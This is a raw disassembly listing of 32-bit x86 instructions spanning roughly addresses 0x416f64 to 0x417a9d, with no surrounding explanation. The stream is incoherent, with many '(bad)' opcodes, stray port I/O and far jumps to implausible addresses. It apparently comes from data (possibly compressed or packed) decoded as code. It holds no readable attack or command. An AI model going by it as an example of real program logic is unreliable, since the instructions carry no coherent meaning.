  416f64:	mov    bl,0x3b
  416f66:	shl    ch,0x37
  416f69:	(bad)  
  416f6a:	mov    eax,ds:0xb042d98e
  416f6f:	shr    DWORD PTR [esp+esi*1-0x50],cl
  416f73:	in     eax,0x8e
  416f75:	scas   al,BYTE PTR es:[edi]
  416f76:	mov    eax,ds:0xfeb0c57d
  416f7b:	pop    edx
  416f7c:	jle    0x416ff7
  416f7e:	mov    eax,ds:0xfd7600ed
  416f83:	in     al,0x73
  416f85:	loope  0x416fdc
  416f87:	mov    BYTE PTR [edi],ch
  416f89:	data16 std 
  416f8b:	rol    BYTE PTR [ebx-0x21acab3],cl
  416f91:	ret    
  416f92:	cmp    eax,0x7abc4973
  416f97:	in     eax,0xfe
  416f99:	jl     0x416fad
  416f9b:	in     eax,dx
  416f9c:	std    
  416f9d:	ds std 
  416f9f:	outs   dx,BYTE PTR ds:[esi]
  416fa0:	or     BYTE PTR [ecx-0x7f],al
  416fa3:	sub    bh,ch
  416fa5:	cs mov bl,0xde
  416fa8:	call   0x6b26eccb
  416fad:	jmp    0xa8acfe97
  416fb2:	cmp    eax,0x6519b3e4
  416fb7:	in     eax,0xfd
  416fb9:	push   es
	...
  416fe2:	add    BYTE PTR [eax],al
  416fe4:	xlat   BYTE PTR ds:[ebx]
  416fe5:	pop    esp
  416fe6:	call   0xfe277abc
  416feb:	pusha  
  416fec:	mov    bh,0xf8
  416fee:	cmc    
  416fef:	out    dx,al
  416ff0:	jl     0x416fc9
  416ff2:	add    ebp,0x34
  416ff5:	in     eax,0xfd
  416ff7:	cmp    DWORD PTR [edx+0x42286b84],esp
  416ffd:	in     al,0xb3
  416fff:	fldenv [eiz*8+0x5c96c6fd]
  417006:	call   0xfe273afc
  41700b:	pusha  
  41700c:	mov    dh,0x4
  41700e:	imul   BYTE PTR [esi+0x1100727c]
  417014:	jmp    0xf0ae:0xfce93f77
  41701b:	sahf   
  41701c:	cld    
  41701d:	in     al,0xfd
  41701f:	adc    al,0x32
  417021:	repz jmp 0x417024
  417024:	xlat   BYTE PTR ds:[ebx]
  417025:	cdq    
  417026:	dec    BYTE PTR [ecx-0x97fe6]
  41702c:	adc    bl,cl
  41702e:	test   al,dl
  417030:	or     BYTE PTR [ecx-0x5270af02],bl
  417036:	ins    BYTE PTR es:[edi],dx
  417037:	inc    ecx
  417038:	addr16 cdq 
  41703a:	mov    ah,0xf0
  41703c:	or     BYTE PTR [ecx+0x508afffe],bl
  417042:	call   0xfedac814
  417047:	mov    DWORD PTR [eax],eax
	...
  417071:	add    dl,bl
  417073:	mov    esi,esi
  417075:	call   DWORD PTR [eax]
  417077:	mov    dh,0xfd
  417079:	addr16 nop
  41707b:	stos   DWORD PTR es:[edi],eax
  41707c:	inc    eax
  41707d:	add    BYTE PTR [eax+0x63],ah
  417080:	in     eax,dx
  417081:	not    DWORD PTR [eax-0x67]
  417084:	(bad)  
  417085:	jne    0x4170a6
  417087:	xor    BYTE PTR [edi-0x7766cfd0],ch
  41708d:	test   DWORD PTR [ebx+0x21],edx
  417090:	(bad)  
  417091:	jmp    DWORD PTR [edx+0x10f7c1d3]
  417097:	call   0x40:0xab9d684d
  41709e:	loopne 0x41710b
  4170a0:	in     eax,dx
  4170a1:	not    DWORD PTR [eax]
  4170a3:	call   0x308f:0x2fdf75fe
  4170aa:	lock cdq 
  4170ac:	mov    BYTE PTR [ebp-0x1de71],al
  4170b2:	ins    DWORD PTR es:[edi],dx
  4170b3:	pop    edi
  4170b4:	push   0xfe188293
  4170b9:	dec    BYTE PTR [edx+0x2f]
  4170bc:	idiv   bh
  4170be:	loopne 0x417059
  4170c0:	je     0x4170ca
  4170c2:	iret   
  4170c3:	mov    eax,ds:0xcd3eff2d
  4170c8:	mov    DWORD PTR [esi+edi*2-0x3401c034],eax
  4170cf:	jbe    0x41714d
  4170d1:	not    BYTE PTR [ecx+0x67d464]
	...
  4170ff:	add    BYTE PTR [ecx-0x7f003ea2],ch
  417105:	cs xor al,0xf6
  417108:	jns    0x417186
  41710a:	aas    
  41710b:	je     0x417153
  41710d:	mov    dl,bh
  41710f:	das    
  417110:	imul   ecx,DWORD PTR [ecx+ecx*4+0x3f8ca284],0x30debdfe
  41711b:	not    BYTE PTR [ecx+0x24]
  41711e:	add    al,0xf
  417120:	ret    0x434
  417123:	add    BYTE PTR [esi],bh
  417125:	jno    0x4171a4
  417127:	iret   
  417128:	xor    DWORD PTR [edx],edi
  41712a:	aas    
  41712b:	jmp    FWORD PTR [edx-0x19437b11]
  417131:	inc    ecx
  417132:	aas    
  417133:	(bad)  
  417134:	add    DWORD PTR ds:[esi+0x1f43eb0],eax
  41713b:	push   0xbd30f43e
  417140:	or     DWORD PTR [eax+0x11],esp
  417143:	call   0xfe828d0c
  417148:	stc    
  417149:	mov    edi,0x1f1f62d
  41714e:	inc    ecx
  41714f:	je     0x41719f
  417151:	sbb    al,0x10
  417153:	sub    ah,cl
  417155:	adc    DWORD PTR [ecx-0x4c],eax
  417158:	out    0xa1,al
  41715a:	inc    eax
  41715b:	(bad)  
  41715c:	shl    DWORD PTR [edi],1
  41715e:	adc    al,0xe8
  417160:	ds pop esi
  417162:	aas    
  417163:	inc    BYTE PTR [eax]
	...
  41718d:	add    cl,al
  41718f:	addr16 and eax,0xa65bb9f6
  417195:	inc    eax
  417196:	sub    cl,BYTE PTR [ebx-0x71]
  417199:	xor    eax,0x4096e256
  41719e:	jmp    0x3ce2:0x984096ff
  4171a5:	and    ecx,DWORD PTR [eax+0x12407ee2]
  4171ab:	dec    ebx
  4171ac:	jg     0x417223
  4171ae:	push   esi
  4171af:	loop   0x41721f
  4171b1:	inc    eax
  4171b2:	mov    dl,0x3
  4171b4:	pop    edi
  4171b5:	inc    eax
  4171b6:	jo     0x41719a
  4171b8:	aam    0x13
  4171ba:	push   esi
  4171bb:	or     eax,DWORD PTR [ecx]
  4171bd:	inc    ecx
  4171be:	pusha  
  4171bf:	loop   0x417155
  4171c1:	push   ebx
  4171c2:	push   eax
  4171c3:	loop   0x41720b
  4171c5:	inc    eax
  4171c6:	mov    al,BYTE PTR [edi]
  4171c8:	aaa    
  4171c9:	inc    eax
  4171ca:	dec    eax
  4171cb:	loop   0x417189
  4171cd:	adc    edx,DWORD PTR [esi-0x35]
  4171d0:	add    BYTE PTR [ecx+0x38],al
  4171d3:	loop   0x417231
  4171d5:	dec    edi
  4171d6:	sub    dl,ah
  4171d8:	push   ds
  4171d9:	inc    eax
  4171da:	mov    dl,0x4b
  4171dc:	push   DWORD PTR [eax+0x56]
  4171df:	loop   0x4171ef
  4171e1:	inc    eax
  4171e2:	rcl    BYTE PTR [esi],cl
  4171e4:	(bad)  
  4171e5:	aas    
  4171e6:	adc    dl,ah
  4171e8:	xor    al,0x4b
  4171ea:	adc    dl,ah
  4171ec:	idiv   BYTE PTR [edi]
  4171ee:	mov    cl,BYTE PTR [ebx-0x1]
  4171f1:	mov    al,0x0
	...
  41721b:	add    BYTE PTR [esi],ah
  41721d:	loop   0x417205
  41721f:	aas    
  417220:	stos   BYTE PTR es:[edi],al
  417221:	sbb    dl,bh
  417223:	aas    
  417224:	call   0xd655cf0a
  417229:	into   
  41722a:	add    BYTE PTR [edi],bh
  41722c:	fsub   st,st(1)
  41722e:	jl     0x4172ac
  417230:	enter  0xbee1,0x3f
  417234:	xchg   edx,eax
  417235:	sahf   
  417236:	add    BYTE PTR [esi+0x34fde101],bh
  41723c:	push   edx
  41723d:	repz dec esp
  41723f:	shl    BYTE PTR [eax-0x1f],1
  417242:	std    
  417243:	adc    al,0x52
  417245:	loop   0x4171fa
  417247:	cdq    
  417248:	imul   esp,ecx,0x59d78efd
  41724e:	call   0xfe2271be
  417253:	jle    0x41725c
  417255:	repnz cmc 
  417257:	jbe    0x41729a
  417259:	cli    
  41725a:	inc    edi
  41725b:	mov    ebp,0x9cfde138
  417260:	cs jmp 0x205bd163
  417266:	sub    al,0x56
  417268:	and    ecx,esp
  41726a:	mov    bl,0x41
  41726c:	adc    ecx,esp
  41726e:	std    
  41726f:	push   ecx
  417270:	dec    ebp
  417271:	xor    eax,0xa7093efd
  417276:	in     al,0x3e
  417278:	add    ecx,esp
  41727a:	call   0xfe23a080
  41727f:	add    BYTE PTR es:[eax],al
	...
  4172aa:	mov    bh,0x0
  4172ac:	neg    BYTE PTR [esi]
  4172ae:	imul   edi,eax,0xe160c51b
  4172b4:	std    
  4172b5:	push   esp
  4172b6:	jp     0x4172a1
  4172b8:	std    
  4172b9:	push   es
  4172ba:	bound  ecx,QWORD PTR [edx+0x2c]
  4172bd:	dec    BYTE PTR [eax-0x1f]
  4172c0:	mov    bl,0x1d
  4172c2:	dec    ecx
  4172c3:	loope  0x4172c2
  4172c5:	add    DWORD PTR [ecx+0x2f],eax
  4172c8:	std    
  4172c9:	out    0x30,al
  4172cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172cc:	int3   
  4172cd:	(bad)  
  4172ce:	sub    cl,ah
  4172d0:	call   0xfe2347aa
  4172d5:	into   
  4172d6:	push   esi
  4172d7:	sbb    dh,dh
  4172d9:	add    al,bh
  4172db:	and    ebp,esp
  4172dd:	icebp  
  4172de:	sub    al,0x20
  4172e0:	(bad)  
  4172e1:	inc    DWORD PTR [edx-0x64]
  4172e4:	idiv   bh
  4172e6:	call   0xd86d561f
  4172eb:	and    esi,edi
  4172ed:	mov    ch,0xb
  4172ef:	sub    esi,edi
  4172f1:	(bad)  
  4172f2:	mov    edi,0xc8ff2a85
  4172f7:	and    DWORD PTR [eax+edi*8-0x52],eax
  4172fb:	hlt    
  4172fc:	cld    
  4172fd:	dec    DWORD PTR [eax]
  4172ff:	and    DWORD PTR [esp+edi*8-0x41],esi
  417303:	sub    DWORD PTR [esi],edx
  417305:	add    BYTE PTR [edi-0x71],ah
  417308:	mov    edi,0x8b03670c
  41730d:	in     al,dx
	...
  417336:	add    BYTE PTR [eax],al
  417338:	aam    0x97
  41733a:	stc    
  41733b:	push   0x57
  41733d:	mov    dl,0x59
  41733f:	push   DWORD PTR [edx+0x54]
  417342:	call   0xfe61a334
  417347:	mov    DWORD PTR [edx+0x5f75fe20],esp
  41734d:	mov    ah,0x28
  41734f:	ins    DWORD PTR es:[edi],dx
  417350:	out    0x5b,al
  417352:	std    
  417353:	xor    eax,0x411464
  417358:	dec    edi
  417359:	mov    edi,ecx
  41735b:	dec    DWORD PTR [eax+0x21]
  41735e:	je     0x417368
  417360:	mov    edi,0x27416cee
  417365:	mov    ah,0xff
  417367:	call   DWORD PTR [edi]
  417369:	fsubr  st(5),st
  41736b:	mov    ebx,0xfffe1e0b
  417370:	jb     0x417392
  417372:	(bad)  
  417373:	jne    0x417364
  417375:	xor    edi,ebp
  417377:	sub    BYTE PTR [eax],cl
  417379:	push   ds
  41737a:	enter  0x3ec2,0xee
  41737e:	add    DWORD PTR [ebp-0x3b],edx
  417381:	popf   
  417382:	jg     0x417347
  417384:	ror    BYTE PTR [ecx+0x5fd90004],cl
  41738a:	lods   al,BYTE PTR ds:[esi]
  41738b:	stos   DWORD PTR es:[edi],eax
  41738c:	push   ebx
  41738d:	xor    eax,DWORD PTR [edi+edi*8]
  417390:	xor    edi,esi
  417392:	cmp    al,0x74
  417394:	inc    esi
  417395:	retf   0x53d5
  417398:	test   eax,0xacc0
	...
  4173c5:	add    BYTE PTR [esi],bh
  4173c7:	fnstcw WORD PTR [esi+0x67]
  4173ca:	(bad)  
  4173cb:	faddp  st(2),st
  4173cd:	call   DWORD PTR [eax+0x13ff0dde]
  4173d3:	jmp    0xfe3b:0x68ea3f29
  4173da:	repz std 
  4173dc:	sub    DWORD PTR [ebp+0xa3b792e],esp
  4173e2:	jle    0x4173e9
  4173e4:	test   DWORD PTR [eax-0x537a05],0x677e2059
  4173ee:	mov    ds:0x48ffc306,al
  4173f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173f4:	cmp    eax,0x29f9cbfe
  4173f9:	sbb    edx,DWORD PTR [edx+0x3f673b2d]
  4173ff:	hlt    
  417400:	sub    al,0xbd
  417402:	xchg   esi,eax
  417403:	jl     0x4173b2
  417405:	inc    eax
  417406:	ds inc ebp
  417408:	mov    ch,0xfb
  41740a:	sbb    eax,ecx
  41740c:	or     eax,ebp
  41740e:	cmp    eax,eax
  417410:	cmp    al,0xfe
  417412:	or     DWORD PTR [eax+0x3d],ebp
  417415:	out    0x33,eax
  417417:	sbb    DWORD PTR ds:0xc3307fe,edi
  41741d:	add    BYTE PTR [ebx-0x43d08da5],cl
  417423:	pop    ss
  417424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417425:	test   eax,0xade676e1
	...
  417452:	add    BYTE PTR [eax],al
  417454:	jle    0x4174b1
  417456:	aas    
  417457:	push   ebp
  417458:	bound  ebx,QWORD PTR [edi+eiz*8-0x30b0adc4]
  41745f:	add    al,0x10
  417461:	fidiv  WORD PTR [esi-0x2a9881f8]
  417467:	mov    bh,dl
  417469:	fisub  WORD PTR [esi+0x14dea5b6]
  41746f:	or     al,0x96
  417471:	jle    0x417409
  417473:	cmp    al,0x98
  417475:	ficom  WORD PTR [eax+eax*2]
  417478:	cdq    
  417479:	or     dl,dl
  41747b:	cmp    al,0x88
  41747d:	jno    0x417466
  41747f:	stos   DWORD PTR es:[edi],eax
  417480:	pop    esi
  417481:	ins    DWORD PTR es:[edi],dx
  417482:	sub    BYTE PTR [esi+eiz*8],al
  417485:	add    eax,0xdd71c2fd
  41748a:	fmul   QWORD PTR [edi]
  41748c:	push   esi
  41748d:	add    al,0xd
  41748f:	cmp    eax,0xb7275260
  417494:	xor    edx,esp
  417496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417497:	aas    
  417498:	push   eax
  417499:	push   0x52d23c43
  41749e:	dec    edi
  41749f:	repnz inc eax
  4174a1:	fidiv  WORD PTR [esi]
  4174a3:	cmp    al,0xb2
  4174a5:	fistp  QWORD PTR [edi]
  4174a7:	fisub  WORD PTR fs:0x29a9
  4174ad:	jbe    0x417488
  4174af:	lods   eax,DWORD PTR ds:[esi]
  4174b0:	jle    0x41750d
  4174b2:	jg     0x4174e2
  4174b4:	stos   BYTE PTR es:[edi],al
  4174b5:	pushf  
  4174b6:	out    0x3c,eax
	...
  4174e0:	add    BYTE PTR [eax],al
  4174e2:	mov    cl,BYTE PTR [edi+0xf]
  4174e5:	push   0x7fede5a
  4174ea:	(bad)  
  4174eb:	data16 add bh,bl
  4174ee:	les    edx,FWORD PTR [esi-0x1e541104]
  4174f4:	std    
  4174f5:	pop    esp
  4174f6:	cmp    dh,bl
  4174f8:	add    esi,ebx
  4174fa:	and    eax,0x165cfddd
  4174ff:	div    BYTE PTR [edi+0x3]
  417502:	adc    eax,0xe2c8bdd
  417507:	mov    gs,WORD PTR [eax+0xd]
  41750a:	xchg   esp,eax
  41750b:	call   0xe93f:0x6f674100
  417512:	je     0x41757b
  417514:	or     al,0x91
  417516:	jmp    0x31e07249
  41751b:	sbb    esi,DWORD PTR [ebp+0x10]
  41751e:	retf   
  41751f:	xchg   esi,eax
  417520:	clc    
  417521:	push   0xffffffd7
  417523:	jmp    0xd117712c
  417528:	inc    ebx
  417529:	xor    DWORD PTR [ecx+0x5cd93cdd],0x3ef7fddd
  417533:	mov    ds:0x5b420e10,eax
  417538:	xchg   DWORD PTR [ebp+ebp*1-0x70a9b30f],esp
  41753f:	in     eax,dx
  417540:	push   0x9aa413
  417545:	je     0x417547
	...
  41756f:	add    BYTE PTR [edi+0x15],bh
  417572:	push   ecx
  417573:	push   ecx
  417574:	jae    0x4175bd
  417576:	add    cl,ch
  417578:	rcr    BYTE PTR [eax],0xd
  41757b:	pop    esp
  41757c:	call   FWORD PTR [eax]
  41757e:	push   ecx
  41757f:	je     0x417580
  417581:	adc    al,0x51
  417583:	xchg   ecx,eax
  417584:	push   esi
  417585:	outs   dx,DWORD PTR ds:[esi]
  417586:	aas    
  417587:	jmp    0x14ddce0
  41758c:	and    eax,0x4000fd30
  417591:	dec    esp
  417592:	shl    BYTE PTR [ebx+eiz*8-0x31],0x44
  417597:	cld    
  417598:	mov    fs:0x4d6903c1,al
  41759e:	std    
  41759f:	jne    0x417584
  4175a1:	and    DWORD PTR [eax+ecx*1+0xf],esi
  4175a5:	fdivr  st,st(3)
  4175a7:	push   eax
  4175a9:	and    DWORD PTR [esp+edi*8-0x1],esi
  4175ad:	sub    DWORD PTR [eax],ebp
  4175af:	inc    DWORD PTR [eax]
  4175b1:	and    cl,BYTE PTR [eax+esi*8+0x54]
  4175b5:	mov    ds:0x717a00ed,eax
  4175ba:	(bad)  
  4175bb:	jne    0x4175ac
  4175bd:	xor    bl,ah
  4175bf:	sub    eax,esp
  4175c1:	and    eax,ecx
  4175c3:	ret    0x58af
  4175c6:	push   ebx
  4175c7:	mov    eax,ebx
  4175c9:	aad    0xc1
  4175cb:	cld    
  4175cc:	cmp    eax,0xc05d6a57
  4175d1:	stos   DWORD PTR es:[edi],eax
  4175d2:	add    eax,0xe8
	...
  4175fb:	add    BYTE PTR [eax],al
  4175fd:	add    BYTE PTR [edi-0x21000107],cl
  417603:	sbb    bh,dl
  417605:	push   0xbeed5867
  41760a:	(bad)  
  41760b:	je     0x417679
  41760d:	inc    ecx
  41760e:	push   edi
  41760f:	mov    al,0xc1
  417611:	ins    DWORD PTR es:[edi],dx
  417612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417613:	pop    eax
  417614:	std    
  417615:	jne    0x417676
  417617:	xor    dl,dh
  417619:	push   edx
  41761a:	add    BYTE PTR [ecx],ah
  41761c:	add    DWORD PTR gs:[edi+0x31],edx
  417620:	mov    ebx,0x40b3af68
  417625:	add    bh,bh
  417627:	sbb    ebp,DWORD PTR [ecx+eax*2+0x17]
  41762b:	and    DWORD PTR [eax+ecx*1+0x4f],esi
  41762f:	test   BYTE PTR [edi-0x1],cl
  417632:	ds inc ebp
  417634:	test   eax,0x78dd11ff
  417639:	addr16 fcmovb st,st(6)
  41763c:	(bad)  
  41763d:	call   FWORD PTR [ecx+0x3e40a82f]
  417643:	in     eax,0xad
  417645:	pop    es
  417646:	out    0x36,al
  417648:	sar    esi,cl
  41764a:	jmp    0xd14177d8
  41764f:	mov    ebx,0x336bb7ac
  417654:	add    al,0x68
  417656:	add    ebx,DWORD PTR [edi]
  417658:	sar    edi,0xc8
  41765b:	push   ds
  41765c:	or     al,0xe8
  41765e:	nop
  41765f:	aas    
  417660:	aaa    
  417661:	inc    BYTE PTR [eax]
	...
  41768b:	add    BYTE PTR [ecx-0xb8bb22],bh
  417691:	icebp  
  417692:	cmp    BYTE PTR [esi+esi*1-0x36],dh
  417696:	fdivp  st(5),st
  417698:	mov    eax,ds:0x3e01acbc
  41769d:	repnz cmp esi,0x4c29fa0b
  4176a4:	mov    ah,dl
  4176a6:	aaa    
  4176a7:	dec    BYTE PTR [ebx]
  4176a9:	pop    esi
  4176aa:	aaa    
  4176ab:	je     0x4176f3
  4176ad:	fimul  DWORD PTR [ecx+0x25]
  4176b0:	jno    0x41771e
  4176b2:	dec    ecx
  4176b3:	rol    DWORD PTR [edx-0xe],0xce
  4176b7:	mov    dl,BYTE PTR [edx+0x70]
  4176ba:	inc    eax
  4176bb:	sti    
  4176bc:	pop    ecx
  4176bd:	dec    BYTE PTR ds:0x29e1cbff
  4176c3:	xchg   edi,eax
  4176c4:	pop    es
  4176c5:	xchg   ebp,eax
  4176c6:	aaa    
  4176c7:	or     bh,BYTE PTR [esi-0x5b]
  4176ca:	repnz mov BYTE PTR [ebx+0x56743790],al
  4176d1:	mov    DWORD PTR [ebp+0x3c5c1607],ebp
  4176d7:	fbld   TBYTE PTR [eax]
  4176d9:	fistp  DWORD PTR [esi]
  4176db:	scas   eax,DWORD PTR es:[edi]
  4176dc:	inc    ebp
  4176dd:	ficomp DWORD PTR [ebx+ecx*1+0x38c58826]
  4176e4:	or     bl,bl
  4176e6:	jl     0x41771f
  4176e8:	add    BYTE PTR [ecx-0x11],dl
  4176eb:	sub    ebx,DWORD PTR [esi]
  4176ed:	xor    esi,0x38
	...
  417717:	add    BYTE PTR [eax],al
  417719:	add    al,dh
  41771b:	push   eax
  41771c:	jmp    0x417749
  41771e:	inc    ebx
  41771f:	test   dh,ah
  417721:	cmp    BYTE PTR [ecx+0x3e03e75c],ch
  417727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417728:	test   eax,0x62303e0f
  41772d:	daa    
  41772e:	mov    esp,0x6bd0bf9f
  417733:	adc    bl,BYTE PTR cs:[ebp-0x8]
  417737:	sbb    eax,0xe7b1c345
  41773c:	and    al,0x38
  41773e:	stc    
  41773f:	xor    DWORD PTR [esi+0x14da31ae],esp
  417745:	or     BYTE PTR [esi-0x6fc73d30],ah
  41774b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41774d:	scas   eax,DWORD PTR es:[edi]
  41774e:	daa    
  41774f:	sub    ecx,DWORD PTR [edi]
  417751:	add    al,0x3e
  417753:	retf   0x383d
  417756:	repnz (bad) 
  417758:	pop    ss
  417759:	shl    DWORD PTR [eax+0x50],1
  41775c:	fild   QWORD PTR [ebx]
  41775e:	call   0x3479de3c
  417763:	mov    bl,0x4f
  417765:	js     0x417788
  417767:	ficom  DWORD PTR [esi+0x37]
  41776a:	or     al,0x9b
  41776c:	nop
  41776d:	cmp    BYTE PTR [eax-0x26],cl
  417770:	inc    esi
  417771:	xor    eax,0xaee69393
  417776:	std    
  417777:	sbb    DWORD PTR [ecx],eax
  417779:	pushf  
  41777a:	out    0x1a,al
  41777c:	add    BYTE PTR [eax+eax*1+0x0],bl
	...
  4177a8:	call   0x66ffc882
  4177ad:	dec    edi
  4177ae:	adc    BYTE PTR [esi],bl
  4177b0:	call   0x229f601a
  4177b5:	fscale 
  4177b7:	loop   0x417836
  4177b9:	dec    esi
  4177ba:	xor    BYTE PTR [ecx-0x6e07e14c],bl
  4177c0:	inc    edx
  4177c1:	pop    ebx
  4177c2:	in     eax,dx
  4177c3:	aaa    
  4177c4:	ss dec edi
  4177c6:	or     BYTE PTR [ecx],al
  4177c8:	in     eax,0x7e
  4177ca:	std    
  4177cb:	out    0xf1,al
  4177cd:	fdiv   DWORD PTR [ebx-0xf]
  4177d0:	and    eax,0x9d623eb
  4177d5:	fnstenv [ebx-0x33]
  4177d8:	adc    DWORD PTR [edi-0x8],ecx
  4177db:	(bad)  
  4177dc:	(bad)  
  4177dd:	popa   
  4177de:	call   0xfe1a16f9
  4177e3:	shl    ebp,0x81
  4177e6:	std    
  4177e7:	scas   al,BYTE PTR es:[edi]
  4177e8:	mov    ebp,0xada4ffa4
  4177ed:	sbb    DWORD PTR [eax-0x226ae62],edi
  4177f3:	fwait
  4177f4:	sbb    BYTE PTR [edx+0x19201405],dl
  4177fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177fb:	push   ss
  4177fc:	jnp    0x4177d7
  4177fe:	mov    WORD PTR [esi+esi*1],fs
  417801:	sub    dl,BYTE PTR [ebp+0x76]
  417804:	scas   eax,DWORD PTR es:[edi]
  417805:	imul   edi,ebp,0x5bc341f4
  41780b:	adc    al,BYTE PTR [eax]
	...
  417835:	add    BYTE PTR [ecx],ch
  417837:	(bad)  [ecx]
  417839:	sub    DWORD PTR [esi+0xa625033],ecx
  41783f:	fnstsw WORD PTR [ebx+0x4d]
  417842:	inc    ebx
  417843:	push   ecx
  417844:	dec    esp
  417845:	add    bh,dl
  417847:	rol    BYTE PTR [eax],1
  417849:	jne    0x417868
  41784b:	pop    ss
  41784c:	dec    DWORD PTR [ebp+0x6b]
  41784f:	pop    es
  417850:	add    DWORD PTR [eax],eax
  417852:	push   0x5b75fe51
  417857:	test   eax,0x64b2ff56
  41785c:	call   0xfed1a237
  417861:	or     ecx,DWORD PTR [edi-0x7c]
  417864:	sub    al,0x80
  417866:	stc    
  417867:	pop    edx
  417868:	jae    0x417892
  41786a:	mov    eax,ds:0xbdfc4c91
  41786f:	pop    esp
  417870:	mov    eax,DWORD PTR [ebp-0x25]
  417873:	lods   al,BYTE PTR ds:[esi]
  417874:	push   ebx
  417875:	call   0x4027d0
  41787a:	int3   
  41787b:	sbb    al,0x71
  41787d:	adc    al,0x7f
  41787f:	pop    ebp
  417880:	add    bh,ch
  417882:	mov    ecx,0x21fc7491
  417887:	test   al,0xfe
  417889:	jne    0x41783a
  41788b:	test   BYTE PTR [esi+0xa91e8fe],ah
  417891:	fdivr  DWORD PTR [edi+0x79]
  417894:	es (bad) 
  417896:	fcom   DWORD PTR [eax+0xc032]
	...
  4178c4:	push   ds
  4178c5:	xchg   ecx,eax
  4178c6:	(bad)  
  4178c7:	jmp    FWORD PTR [eax-0x5fc75476]
  4178cd:	or     eax,DWORD PTR [edx+0x4101c1bf]
  4178d3:	add    dl,ch
  4178d5:	call   0x1074:0x905050f9
  4178dc:	fmul   DWORD PTR [edx]
  4178de:	or     ch,al
  4178e0:	sti    
  4178e1:	sar    esi,0xff
  4178e4:	dec    esp
  4178e5:	sbb    al,0x71
  4178e7:	xor    BYTE PTR [esi],bh
  4178e9:	adc    cl,BYTE PTR [ebp-0x265b9bc]
  4178ef:	call   DWORD PTR [eax-0x20]
  4178f2:	ss je  0x41793b
  4178f5:	sub    ah,BYTE PTR [ecx-0x316ecedd]
  4178fb:	(bad)  
  4178fc:	mov    bl,0xba
  4178fe:	sub    DWORD PTR [eax-0x1c97ea6],edi
  417904:	xchg   ebx,eax
  417905:	jbe    0x41793d
  417907:	je     0x41791f
  417909:	jno    0x4178bb
  41790b:	pop    es
  41790c:	push   ss
  41790d:	jmp    0x6a4377ef
  417912:	xchg   edx,eax
  417913:	es stc 
  417915:	fdivr  DWORD PTR [edi-0x36]
  417918:	aas    
  417919:	into   
  41791a:	out    dx,eax
  41791b:	mov    edi,0xfe33c8a7
  417920:	loope  0x4178d5
  417922:	data16 aaa 
  417924:	inc    ecx
  417925:	das    
  417926:	data16 or al,BYTE PTR [eax]
	...
  417951:	add    ch,dh
  417953:	xor    eax,0xc22e6805
  417958:	and    al,0xbd
  41795a:	rcl    DWORD PTR [esi+0x5e5ce80c],0x33
  417961:	inc    ch
  417963:	add    al,0xd8
  417965:	pop    ebp
  417966:	or     ebx,edi
  417968:	inc    edx
  417969:	(bad)  
  41796b:	xchg   edi,eax
  41796c:	xchg   ebx,ebp
  41796e:	mov    edi,0x91f634fd
  417973:	lock test DWORD PTR [edx+ecx*4-0x6f],eax
  417978:	xor    esi,DWORD PTR [esi+ebp*1-0x1f]
  41797c:	lods   eax,DWORD PTR ds:[esi]
  41797d:	or     esp,DWORD PTR [esi+0x43]
  417980:	(bad)  
  417982:	ds mov ebp,0xe97441
  417988:	mov    esi,0xe75b3ef7
  41798d:	add    edi,DWORD PTR [esi]
  41798f:	mov    al,ds:0x5f502fa4
  417994:	out    0x3,eax
  417996:	aam    0x5a
  417998:	rol    DWORD PTR [ebx],0xd4
  41799b:	pop    edx
  41799c:	rol    DWORD PTR [ebx],1
  41799e:	retf   
  41799f:	and    BYTE PTR [ebx],dh
  4179a1:	aam    0xc2
  4179a3:	loopne 0x4179e0
  4179a5:	sub    eax,0x3497d728
  4179aa:	stos   BYTE PTR es:[edi],al
  4179ab:	shl    DWORD PTR [esi],cl
  4179ad:	scas   eax,DWORD PTR es:[edi]
  4179ae:	adc    eax,0x3e10bfc4
  4179b3:	pop    ebx
  4179b4:	loop   0x4179f9
	...
  4179de:	add    BYTE PTR [eax],al
  4179e0:	lea    ebx,[ecx+0x2]
  4179e3:	mov    edi,0xc2aff699
  4179e8:	stc    
  4179e9:	aad    0x74
  4179eb:	adc    esp,esi
  4179ed:	pop    es
  4179ee:	ret    0xe834
  4179f1:	loop   0x417a0a
  4179f3:	xchg   DWORD PTR [edx-0x27cb2131],edi
  4179f9:	sub    edi,DWORD PTR [ecx]
  4179fb:	sub    al,0xce
  4179fd:	adc    esi,0xd7e0b634
  417a03:	sub    al,0xc0
  417a05:	(bad)  
  417a06:	push   ecx
  417a07:	add    al,0xb9
  417a09:	adc    BYTE PTR [eax-0x49294fd4],bh
  417a0f:	scas   al,BYTE PTR es:[edi]
  417a10:	xor    eax,0x960c34d6
  417a15:	ret    
  417a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a17:	xor    al,0x98
  417a19:	(bad)  
  417a1a:	push   esp
  417a1b:	xor    ecx,DWORD PTR [eax+0x672b96d6]
  417a21:	jge    0x4179b1
  417a23:	xor    al,0x80
  417a25:	and    BYTE PTR [edi+0x28],bh
  417a28:	leave  
  417a29:	(bad)  
  417a2a:	hlt    
  417a2b:	aaa    
  417a2c:	pop    ecx
  417a2d:	aam    0x0
  417a2f:	fstp   TBYTE PTR ds:0x39abc75b
  417a35:	pop    ebx
  417a36:	push   ebx
  417a37:	jb     0x417a5a
  417a39:	fcmovnb st,st(4)
  417a3b:	pop    ecx
  417a3c:	and    dl,ch
  417a3e:	std    
  417a3f:	fs mov dl,dl
  417a42:	push   eax
  417a43:	dec    esi
	...
  417a6c:	add    BYTE PTR [eax],al
  417a6e:	nop
  417a6f:	data16 std 
  417a71:	mov    esp,0xdbe1c341
  417a76:	cmp    eax,0x4229095b
  417a7b:	loopne 0x417a03
  417a7d:	jmp    0xad06d5bf
  417a82:	push   ebp
  417a83:	(bad)  
  417a84:	std    
  417a85:	jmp    0x1d8518c7
  417a8a:	push   edx
  417a8b:	pop    ebp
  417a8c:	add    cl,ch
  417a8e:	xlat   BYTE PTR ds:[ebx]
  417a8f:	aad    0x67
  417a91:	jmp    0xe9a9503d
  417a96:	mov    eax,0xc099f41e
  417a9b:	fdivrp st(4),st
  417a9d:	imul   BYTE PTR ds:0x97e650d5
